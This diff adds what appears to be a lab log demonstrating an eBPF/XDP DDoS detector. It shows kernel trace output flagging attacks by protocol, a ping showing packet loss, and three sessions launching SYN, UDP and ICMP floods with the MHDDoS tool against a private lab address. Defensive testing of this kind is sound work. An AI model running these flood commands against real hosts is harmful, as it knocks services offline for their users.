@@ -1,0 +1,90 @@
+root@SERVER:/# cat /sys/kernel/tracing/trace_pipe
+           <...>-178150  [002] ..s21 253437.646198: bpf_trace_printk: attack on 5 
+          python-178150  [002] ..s21 253439.646208: bpf_trace_printk: attack on 5 
+          python-178150  [002] ..s21 253441.646614: bpf_trace_printk: attack on 4 
+          python-178150  [002] ..s21 253441.646644: bpf_trace_printk: attack on 5 
+          python-178150  [002] ..s21 253443.646602: bpf_trace_printk: attack on 4 
+          python-178150  [002] ..s21 253443.646614: bpf_trace_printk: attack on 5 
+          python-178150  [002] ..s21 253445.646609: bpf_trace_printk: attack on 3 
+          python-178150  [002] ..s21 253445.646621: bpf_trace_printk: attack on 4 
+          python-178150  [002] ..s21 253445.646622: bpf_trace_printk: attack on 5 
+           <...>-178154  [000] ..s21 253447.646612: bpf_trace_printk: attack on 3 
+           <...>-178154  [000] ..s21 253447.646624: bpf_trace_printk: attack on 4 
+           <...>-178154  [000] ..s21 253447.646624: bpf_trace_printk: attack on 5 
+          python-178154  [000] ..s21 253449.646616: bpf_trace_printk: attack on 3 
+          python-178154  [000] ..s21 253449.646627: bpf_trace_printk: attack on 4 
+          python-178154  [000] ..s21 253449.646628: bpf_trace_printk: attack on 5 
+          python-178154  [002] ..s21 253451.646616: bpf_trace_printk: attack on 3 
+          python-178154  [002] ..s21 253451.646628: bpf_trace_printk: attack on 4 
+          python-178154  [002] ..s21 253451.646628: bpf_trace_printk: attack on 5 
+          python-178154  [002] ..s21 253453.646620: bpf_trace_printk: attack on 3 
+          python-178154  [002] ..s21 253453.646632: bpf_trace_printk: attack on 4 
+          python-178154  [002] ..s21 253453.646632: bpf_trace_printk: waiting for attack timeout on 5 for 3 s
+          python-178154  [002] ..s21 253455.646630: bpf_trace_printk: attack on 3 
+          python-178154  [002] ..s21 253455.646641: bpf_trace_printk: attack on 4 
+          python-178154  [002] ..s21 253455.646641: bpf_trace_printk: waiting for attack timeout on 5 for 1 s
+          python-178154  [002] ..s21 253457.646636: bpf_trace_printk: attack on 3 
+          python-178154  [002] ..s21 253457.646649: bpf_trace_printk: waiting for attack timeout on 4 for 3 s
+          python-178154  [002] ..s21 253457.646649: bpf_trace_printk: attack on 5 stopped
+          python-178154  [002] ..s21 253459.646667: bpf_trace_printk: attack on 3 
+          python-178154  [002] ..s21 253459.646696: bpf_trace_printk: waiting for attack timeout on 4 for 1 s
+          python-178154  [002] ..s21 253461.646663: bpf_trace_printk: attack on 3 
+          python-178154  [002] ..s21 253461.646678: bpf_trace_printk: attack on 4 stopped
+          python-178154  [002] ..s21 253463.646668: bpf_trace_printk: attack on 3 
+            ping-178148  [003] ..s21 253466.364474: bpf_trace_printk: attack on 3 
+            ping-178148  [002] ..s21 253468.411056: bpf_trace_printk: waiting for attack timeout on 3 for 3 s
+            ping-178148  [002] ..s21 253470.459502: bpf_trace_printk: waiting for attack timeout on 3 for 1 s
+            ping-178148  [002] ..s21 253472.510009: bpf_trace_printk: attack on 3 stopped
+
+root@CLIENT:/# ping 10.0.3.10
+PING 10.0.3.10 (10.0.3.10) 56(84) bytes of data.
+64 bytes from 10.0.3.10: icmp_seq=1 ttl=63 time=0.193 ms
+64 bytes from 10.0.3.10: icmp_seq=2 ttl=63 time=0.200 ms
+64 bytes from 10.0.3.10: icmp_seq=3 ttl=63 time=0.186 ms
+64 bytes from 10.0.3.10: icmp_seq=4 ttl=63 time=0.038 ms
+64 bytes from 10.0.3.10: icmp_seq=5 ttl=63 time=0.056 ms
+64 bytes from 10.0.3.10: icmp_seq=6 ttl=63 time=0.048 ms
+64 bytes from 10.0.3.10: icmp_seq=7 ttl=63 time=0.038 ms
+64 bytes from 10.0.3.10: icmp_seq=8 ttl=63 time=0.043 ms
+64 bytes from 10.0.3.10: icmp_seq=9 ttl=63 time=0.046 ms
+64 bytes from 10.0.3.10: icmp_seq=10 ttl=63 time=0.043 ms
+64 bytes from 10.0.3.10: icmp_seq=11 ttl=63 time=0.037 ms
+64 bytes from 10.0.3.10: icmp_seq=12 ttl=63 time=0.065 ms
+64 bytes from 10.0.3.10: icmp_seq=39 ttl=63 time=0.237 ms
+64 bytes from 10.0.3.10: icmp_seq=40 ttl=63 time=0.315 ms
+64 bytes from 10.0.3.10: icmp_seq=41 ttl=63 time=0.466 ms
+64 bytes from 10.0.3.10: icmp_seq=42 ttl=63 time=0.321 ms
+64 bytes from 10.0.3.10: icmp_seq=43 ttl=63 time=0.157 ms
+64 bytes from 10.0.3.10: icmp_seq=44 ttl=63 time=0.060 ms
+^C
+--- 10.0.3.10 ping statistics ---
+44 packets transmitted, 18 received, 59.0909% packet loss, time 44026ms
+rtt min/avg/max/mdev = 0.037/0.141/0.466/0.123 ms
+
+
+(xdp-venv) root@TCP_DDOS:/# python ./MHDDoS/start.py syn 10.0.3.10:1201 1 1000
+/xdp-venv/lib/python3.12/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (7.2.0)/charset_normalizer (3.4.6) doesn't match a supported version!
+  warnings.warn(
+//./MHDDoS/start.py:53: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1
+//./MHDDoS/start.py:55: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1_1
+[13:30:57 - INFO] Attack Started to 10.0.3.10 with SYN method for 1000 seconds, threads: 1!
+
+(xdp-venv) root@UDP_DDOS:/# python ./MHDDoS/start.py udp 10.0.3.10:1200 1 1000
+/xdp-venv/lib/python3.12/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (7.2.0)/charset_normalizer (3.4.6) doesn't match a supported version!
+  warnings.warn(
+//./MHDDoS/start.py:53: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1
+//./MHDDoS/start.py:55: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1_1
+[13:30:54 - INFO] Attack Started to 10.0.3.10 with UDP method for 1000 seconds, threads: 1!
+
+(xdp-venv) root@ICMP_DDOS:/# python ./MHDDoS/start.py icmp 10.0.3.10 1 1000
+/xdp-venv/lib/python3.12/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (7.2.0)/charset_normalizer (3.4.6) doesn't match a supported version!
+  warnings.warn(
+//./MHDDoS/start.py:53: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1
+//./MHDDoS/start.py:55: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1_1
+[13:31:03 - INFO] Attack Started to 10.0.3.10 with ICMP method for 1000 seconds, threads: 1!
